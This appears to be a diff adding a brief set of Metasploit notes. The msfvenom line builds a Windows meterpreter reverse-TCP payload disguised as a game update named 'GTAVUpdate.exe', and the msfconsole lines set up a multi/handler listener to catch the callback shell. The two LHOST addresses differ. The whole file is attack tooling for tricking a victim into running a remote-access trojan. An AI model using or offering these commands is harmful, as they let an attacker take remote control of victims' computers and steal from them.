@@ -1,0 +1,9 @@
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.0.100 LPORT=4444 -o /home/hadi/Desktop/GTAVUpdate.exe
+
+msfconsole
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.195.72
+set LPORT 4444
+run atau exploit
